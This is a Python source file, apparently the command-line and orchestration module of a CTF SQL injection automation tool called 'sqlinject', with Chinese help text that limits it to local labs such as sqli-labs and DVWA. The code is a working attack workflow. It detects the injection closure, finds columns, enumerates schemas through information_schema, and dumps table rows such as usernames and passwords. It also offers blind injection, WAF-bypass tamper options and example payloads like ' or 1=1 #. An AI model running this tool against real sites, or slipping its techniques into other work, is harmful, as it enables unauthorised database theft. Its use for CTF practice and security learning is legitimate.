# -*- coding: utf-8 -*-
"""命令行参数解析与主流程编排"""
import argparse
import sys

from . import __version__
from .utils import (Http, C, info, ok, warn, err, result,
                    parse_post_data)
from .detector import InjectionPoint, detect_closure, find_columns, \
    find_echo, CLOSURES
from .extractor import Extractor
from .blind import blind_dump, blind_extract_chain
from . import bypass


def build_argparser():
    p = argparse.ArgumentParser(
        prog="sqlinject",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=(
            f"CTF SQL 注入自动化工具 v{__version__}\n"
            "五步方法论: 确认注入 -> 探测列数 -> 爆库 -> 爆表爆列 -> 提取数据\n"
            "仅用于本地靶场学习(sqli-labs/DVWA), 禁止未授权测试"),
        epilog=(
            "用法示例:\n"
            "  # GET 整数型注入(Less-2)\n"
            "  ./sqlinject.py -u \"http://127.0.0.1/sqli-labs/Less-2/?id=1\"\n"
            "\n"
            "  # 指定参数名\n"
            "  ./sqlinject.py -u \"http://target/page?id=1\" -p id\n"
            "\n"
            "  # POST 注入(登录框, Less-11)\n"
            "  ./sqlinject.py -u \"http://127.0.0.1/sqli-labs/Less-11/\" "
            "-d \"uname=admin&passwd=1\"\n"
            "\n"
            "  # Cookie 注入(Less-20)\n"
            "  ./sqlinject.py -u \"http://127.0.0.1/sqli-labs/Less-20/\" "
            "--cookie \"uname=admin; security=low\"\n"
            "\n"
            "  # UA 注入(需先登录成功, Less-18)\n"
            "  ./sqlinject.py -u \"http://127.0.0.1/sqli-labs/Less-18/\" "
            "-d \"uname=Dhakkan&passwd=dumb\" --ua-point\n"
            "\n"
            "  # Referer 注入(Less-19)\n"
            "  ./sqlinject.py -u \"http://127.0.0.1/sqli-labs/Less-19/\" "
            "-d \"uname=Dhakkan&passwd=dumb\" --referer-point\n"
            "\n"
            "  # 布尔盲注(Less-5)\n"
            "  ./sqlinject.py -u \"http://127.0.0.1/sqli-labs/Less-5/?id=1\" "
            "--blind bool\n"
            "\n"
            "  # 时间盲注\n"
            "  ./sqlinject.py -u \"http://target/?id=1\" --blind time "
            "--sleep 5\n"
            "\n"
            "  # WAF 绕过(可组合)\n"
            "  ./sqlinject.py -u \"http://target/?id=1\" "
            "--tamper space2comment,doublewrite\n"
            "\n"
            "  # 只提取指定表的数据\n"
            "  ./sqlinject.py -u \"...\" --table users "
            "--columns username,password\n"
            "\n"
            "  # 自定义 payload 测试\n"
            "  ./sqlinject.py -u \"...\" --custom \"' or 1=1 #\"\n"))
    p.add_argument("-u", "--url", required=True,
                   help="目标 URL（GET 注入需含参数，如 ?id=1）")
    p.add_argument("-p", "--param", default=None,
                   help="注入参数名（默认自动取 URL 第一个 GET 参数 / POST 第一个键 / Cookie 第一个键）")
    p.add_argument("-d", "--data", default=None,
                   help="POST 数据体，如 \"uname=admin&passwd=1\"；提供后走 POST")
    p.add_argument("--cookie", default=None,
                   help="Cookie 字符串，如 \"uname=admin; other=x\"；配合 --cookie-point 把 uname 作为注入点")
    p.add_argument("--cookie-point", action="store_true",
                   help="以 Cookie 作为注入载体")
    p.add_argument("--ua-point", action="store_true",
                   help="以 User-Agent 头作为注入载体")
    p.add_argument("--referer-point", action="store_true",
                   help="以 Referer 头作为注入载体")
    p.add_argument("--blind", choices=["bool", "time"], default=None,
                   help="强制盲注模式：bool=页面差异猜解 time=sleep 延迟猜解")
    p.add_argument("--sleep", type=float, default=3,
                   help="时间盲注 sleep 秒数（默认 3）")
    p.add_argument("--tamper", default=None,
                   help=f"WAF 绕过脚本，逗号组合。可用: {bypass.available()}")
    p.add_argument("--fuzzy", action="store_true",
                   help="放宽容差判断（页面有动态噪声时使用）")
    p.add_argument("--db", default=None, help="跳过探测，直接指定数据库")
    p.add_argument("--table", default=None, help="只提取指定表")
    p.add_argument("--columns", default=None,
                   help="与 --table 配合：要导出的列，逗号分隔")
    p.add_argument("--limit", type=int, default=50, help="导出行数上限")
    p.add_argument("--timeout", type=int, default=15, help="请求超时秒数")
    p.add_argument("--delay", type=float, default=0.0,
                   help="每次请求间隔秒数（降低请求频率）")
    p.add_argument("--proxy", default=None, help="代理，如 http://127.0.0.1:8080")
    p.add_argument("--custom", default=None,
                   help="自定义 payload 模式：发送该 payload 并打印响应")
    p.add_argument("--verbose", action="store_true", help="详细输出")
    return p


def pick_point(args):
    """根据参数构造 InjectionPoint 与会话配置"""
    data = parse_post_data(args.data) if args.data else None
    method = "POST" if args.data else "GET"

    cookie = None
    cookie_extra = ""
    if args.cookie:
        parts = [x.strip() for x in args.cookie.split(";") if x.strip()]
        if args.cookie_point and parts:
            first = parts[0]
            param = args.param or first.split("=", 1)[0]
            cookie_extra = "; ".join(parts[1:])
            return (InjectionPoint(args.url, method, param, "cookie",
                                   data or {}, cookie_extra),
                    {"cookie": "; ".join(parts[1:]) or None})
        cookie = args.cookie

    carrier, param = "get", args.param
    if args.ua_point:
        carrier, param = "ua", args.param or "User-Agent"
        data = data  # 登录凭证照发
    elif args.referer_point:
        carrier, param = "referer", args.param or "Referer"
    elif args.data:
        carrier = "post"
        param = args.param or next(iter(data), None)
    else:
        # 从 URL 取第一个查询参数
        from urllib.parse import urlsplit, parse_qsl
        q = parse_qsl(urlsplit(args.url).query, keep_blank_values=True)
        if not q:
            err("URL 中没有 GET 参数：请用 ?id=1 形式，或改用 -d/--cookie/"
                "--ua-point")
            return None, None
        param = args.param or q[0][0]

    pt = InjectionPoint(args.url, method, param, carrier, data or {},
                        cookie_extra,
                        tamper=(lambda s: bypass.apply(s, args.tamper))
                        if args.tamper else None)
    session = {"cookie": cookie}
    return pt, session


def run_custom(args, http, point):
    info(f"自定义 payload: {args.custom}")
    text, elapsed = point.request(http, args.custom)
    print(f"{C.CYAN}{'=' * 60}{C.END}")
    print(text[:3000])
    print(f"{C.CYAN}{'=' * 60}{C.END}")
    result("响应长度", f"{len(text)}B / {elapsed:.2f}s")


def main(argv=None):
    args = build_argparser().parse_args(argv)

    point, session = pick_point(args)
    if point is None:
        return 1

    http = Http(timeout=args.timeout, delay=args.delay, proxy=args.proxy,
                **session)

    banner = f"sqlinject v{__version__}"
    print(f"{C.BOLD}{C.HEADER}{banner}{C.END}")
    info(f"注入点: {point.describe()}")

    base_value = "1"

    # ---- 自定义 payload 模式 ----
    if args.custom:
        run_custom(args, http, point)
        return 0

    tamper_fn = (lambda s: bypass.apply(s, args.tamper)) \
        if args.tamper else None

    def T(payload):
        return bypass.apply(payload, args.tamper) if args.tamper else payload

    try:
        # ---- 盲注模式 ----
        if args.blind:
            if args.table and args.columns:
                src = f"{args.db}.{args.table}" if args.db else args.table
                expr = f"select group_concat({args.columns}) from {src}"
            elif args.table:
                expr = ("select group_concat(column_name) from "
                        "information_schema.columns where table_name="
                        f"0x{args.table.encode().hex()}")
            elif args.db:
                expr = ("select group_concat(table_name) from "
                        "information_schema.tables where table_schema="
                        f"0x{args.db.encode().hex()}")
            else:
                expr = "database()"
            val = blind_dump(http, point, _wrap_closure_for_blind(
                http, point, base_value, args.fuzzy), base_value,
                mode=args.blind, target=T(expr), sleep_time=args.sleep)
            if val:
                ok(f"结果: {val}")
            else:
                warn("未得到结果")
            return 0

        # ---- union 标准流程 ----
        closure = detect_closure(http, point, base_value, verbose=True)
        if closure is None:
            info("回退到时间盲注尝试...")
            cl = _guess_closure(http, point, base_value)
            val = blind_dump(http, point, cl, base_value, mode="time",
                             sleep_time=args.sleep)
            if val:
                ok(f"结果: {val}")
            return 0

        payload_probe = closure.union(base_value, "1,2,3")
        cols = find_columns(http, point, closure, base_value)
        if not cols:
            warn("无法确定列数，中止 union 流程（试试 --blind）")
            return 1
        echo = find_echo(http, point, closure, base_value, cols)
        if not echo:
            warn("无回显位，union 路线终止（参考报错注入/盲注章节）")
            return 1

        ex = Extractor(http, point, closure, base_value, echo, cols)

        db = args.db or ex.current_db()
        if args.table:
            table_names = [args.table]
        else:
            t = ex.tables(db) if db else None
            if not t:
                warn("无法枚举表")
                return 1
            table_names = [t.strip() for t in t.split(",")]

        for tb in table_names:
            cols_str = args.columns
            if not cols_str:
                c = ex.columns(tb, db)
                if not c:
                    continue
                cols_str = ",".join(c.strip().split(",")[:6])
            data = ex.dump(tb, cols_str, db, limit=args.limit)
            if data:
                n_cols = len(cols_str.split(","))
                ok(f"[{tb}] 数据 ({cols_str}):")
                for row in [r for r in data.split("\n") if r.strip()]:
                    parts = row.split(":")
                    if n_cols > 1 and len(parts) >= n_cols:
                        print("    " + " | ".join(parts[:n_cols]))
                    else:
                        print(f"    {row}")
            else:
                warn(f"[{tb}] 无数据或提取失败")
        return 0
    except KeyboardInterrupt:
        print()
        warn("用户中断")
        return 130


def _wrap_closure_for_blind(http, point, base_value, fuzzy=False):
    """盲注前先确定闭合方式；失败时默认整数型"""
    from .detector import detect_closure
    cl = detect_closure(http, point, base_value, verbose=False)
    return cl or CLOSURES[0]


def _guess_closure(http, point, base_value):
    from .detector import detect_closure
    return detect_closure(http, point, base_value, verbose=True) \
        or CLOSURES[0]


if __name__ == "__main__":
    sys.exit(main())
